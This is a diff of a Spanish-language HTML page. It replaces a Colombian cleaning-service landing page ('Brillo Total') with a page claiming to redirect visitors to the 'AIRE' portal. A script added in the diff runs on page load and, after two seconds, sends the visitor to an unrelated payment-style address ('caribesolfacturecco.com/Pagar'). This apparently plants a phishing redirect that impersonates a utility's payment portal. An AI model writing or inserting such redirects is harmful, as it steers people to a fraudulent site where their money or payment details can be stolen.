@@ -1,171 +1,34 @@
+
 <!DOCTYPE html>
 <html lang="es">
 <head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Brillo Total</title>
-  <style>
-    body {
-      margin: 0;
-      font-family: 'Verdana', sans-serif;
-      background-color: #fefefe;
-      color: #222;
-    }
+    <meta charset="UTF-8">
+    <title>Redirigiendo al portal AIRE</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            font-family: sans-serif;
+            background-color: #f4f4f4;
+        }
 
-    .formulario-inicio {
-      background: url('https://th.bing.com/th/id/OIP.erYEHc8H2o8bdzSC0VNfiwHaG8?rs=1&pid=ImgDetMain&cb=idpwebpc2') no-repeat center center/cover;
-      padding: 80px 20px;
-      text-align: center;
-      color: white;
-    }
-
-    .formulario-inicio h1 {
-      font-size: 2.8em;
-      margin-bottom: 10px;
-      text-shadow: 1px 1px 3px #000;
-    }
-
-    .formulario-inicio p {
-      font-size: 1.2em;
-      margin-bottom: 20px;
-      text-shadow: 1px 1px 2px #000;
-    }
-
-    .formulario-inicio input,
-    .formulario-inicio select {
-      padding: 12px;
-      width: 250px;
-      border-radius: 6px;
-      border: none;
-      margin-top: 12px;
-    }
-
-    .formulario-inicio button {
-      padding: 12px 25px;
-      background-color: #b71c1c;
-      color: white;
-      border: none;
-      margin-top: 15px;
-      border-radius: 6px;
-      cursor: pointer;
-      font-weight: bold;
-    }
-
-    .formulario-inicio button:hover {
-      background-color: #7f1313;
-    }
-
-    .info-contacto {
-      background-color: #fff0f0;
-      padding: 40px 20px;
-      text-align: center;
-    }
-
-    .info-contacto h2 {
-      color: #b71c1c;
-    }
-
-    .info-contacto p {
-      margin: 10px 0;
-      font-size: 1.1em;
-    }
-
-    .servicios {
-      background-color: #fceae9;
-      padding: 50px 20px;
-    }
-
-    .servicios h2 {
-      text-align: center;
-      margin-bottom: 30px;
-      color: #b71c1c;
-    }
-
-    .tarjetas {
-      display: flex;
-      flex-wrap: wrap;
-      justify-content: center;
-      gap: 20px;
-    }
-
-    .tarjeta {
-      background-color: white;
-      width: 280px;
-      padding: 20px;
-      border-radius: 10px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.08);
-      text-align: center;
-    }
-
-    .tarjeta img {
-      width: 100%;
-      height: 180px;
-      object-fit: cover;
-      border-radius: 10px;
-      margin-bottom: 15px;
-    }
-
-    .tarjeta h3 {
-      color: #d84315;
-    }
-
-    footer {
-      background-color: #7f1313;
-      color: white;
-      text-align: center;
-      padding: 20px;
-      margin-top: 40px;
-    }
-  </style>
+        .mensaje {
+            font-size: 24px;
+            color: #333;
+        }
+    </style>
+    <script>
+        window.onload = function () {
+            // Espera 2 segundos y redirige
+            setTimeout(function () {
+                window.location.href = "https://caribesolfacturecco.com/Pagar?b=eyJlbmNyeXB0ZWQiOnRydWV9"; // Cambia a tu destino real
+            }, 2000);
+        };
+    </script>
 </head>
 <body>
-
-  <section class="formulario-inicio">
-    <h1>Brillo Total</h1>
-    <p>Tu casa reluciente sin mover un dedo. Agenda tu limpieza fácil y rápido.</p>
-    <input type="text" placeholder="Nombre completo" /><br>
-    <input type="tel" placeholder="Número de contacto" /><br>
-    <input type="text" placeholder="Dirección / Ciudad" /><br>
-    <select>
-      <option value="">Selecciona el tipo de limpieza</option>
-      <option>Rápida</option>
-      <option>Completa</option>
-      <option>Post-evento</option>
-    </select><br>
-    <button>Reservar Limpieza</button>
-  </section>
-
-  <section class="info-contacto" id="info">
-    <h2>¿Cómo Funciona?</h2>
-    <p>1️⃣ Elige el tipo de limpieza</p>
-    <p>2️⃣ Llena tus datos y reserva</p>
-    <p>3️⃣ ¡Listo! Nos encargamos del resto</p>
-  </section>
-
-  <section class="servicios" id="servicios">
-    <h2>Servicios Disponibles</h2>
-    <div class="tarjetas">
-      <div class="tarjeta">
-        <img src="https://i.pinimg.com/736x/d4/91/ad/d491ad991f01e867362087160f0d5cdb.jpg" alt="Desempolvado">
-        <h3>Desempolvado</h3>
-        <p>De muebles, techos y superficies elevadas.</p>
-      </div>
-      <div class="tarjeta">
-        <img src="https://th.bing.com/th/id/R.d5b1b78dc935fe8da1a83fc6e1943693?rik=QGL%2fJajSjb4QbA&pid=ImgRaw&r=0" alt="Limpieza húmeda">
-        <h3>Limpieza Húmeda</h3>
-        <p>Trapeado y desinfección de baños y pisos.</p>
-      </div>
-      <div class="tarjeta">
-        <img src="https://img.freepik.com/premium-photo/spray-hands-person-cleaning-table-furniture-housekeeping-services-home-closeup-cleaner-wipe-surface-with-cloth-bottle-chemical-product-disinfection-dust-bacteria-dirt_590464-213382.jpg" alt="Extras">
-        <h3>Extras Personalizados</h3>
-        <p>Ventanas, microondas, neveras, closets y más.</p>
-      </div>
-    </div>
-  </section>
-
-  <footer>
-    © 2025 Brillo Total · contacto@brillototal.co · Servicio disponible en toda Colombia
-  </footer>
-
+    <div class="mensaje">Redirigiendo al portal AIRE...</div>
 </body>
 </html>
